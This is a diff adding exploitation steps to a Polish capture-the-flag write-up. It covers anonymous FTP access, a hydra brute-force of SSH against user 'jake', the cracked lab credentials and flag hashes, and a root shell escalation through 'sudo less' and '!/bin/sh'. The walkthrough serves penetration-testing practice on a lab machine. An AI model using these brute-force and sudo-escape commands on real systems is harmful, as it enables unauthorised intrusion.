@@ -48,7 +48,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds
 
 Zostały wykryte trzy porty, port 21 i port 80 są najciekawsze ze względu na potencjalne zagrożenia bezpieczeństwa.
 
-## Skanowanie
+## Skanowanie (pierwsza możliwa droga do zdobycia flag)
 
 ### Port 21
 Rozpoczynamy od sprawdzenia portu 21. Ze skanu wynika, ze logowanie Anonymous jest dozwolone. Logujemy się do serwisu i pobieramy znalezioną tam notatkę:
@@ -63,6 +63,62 @@ anonymous:anonymous
 
 ![FTP](img/FTP.JPG)
 
-Z notatki wynika, że hasło użytkownika jake jest słabe. Spróbujmy to wykorzystać: 
+## Eksploitacja
+
+Z notatki wynika, że hasło użytkownika Jake jest słabe. Spróbujmy to wykorzystać przeprowadzając atak brute-force na serwis SSH za pomocą hydry: 
+
+```
+hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.118.60
+```
+
+![Cred](img/Cred.JPG)
+
+Następnie logujemy się do serwisu ssh z pomocą poniższych danych do logowania:
+
+```
+ssh jake@10.10.118.60
+```
+
+```
+jake:987654321
+```
+
+![SSH](img/SSH.JPG)
+
+W katalogu domowym użytkownika holt znajdujemy pierwszą flagę:
+
+![Flag1](img/Flag1.JPG)
+
+```
+ee11cbb19052e40b07aac0ca060c23ee
+```
+
+## Zwiększenie poziomu uprawnień
+
+Widzimy, że użytkownik jake może wykonać komendę less: 
+
+![Less](img/Less.JPG)
+
+Wykorzystujemy [exploita](https://gtfobins.github.io/gtfobins/less/), aby zdobyć uprawnienia root'a:
+
+![Exploit1](img/Exploit1.JPG)
+
+```
+sudo less /etc/profile
+!/bin/sh
+```
+
+W pliku root.txt znajdujemy drugą flagę:
+
+![Flag2](img/Flag2.JPG)
+
+```
+63a9f0ea7bb98050796b649e85481845
+```
+
+## Skanowanie (druga możliwa droga do zdobycia flag)
+
+Do zobaczenia na kolejnych CTF-ach!
+
 
 
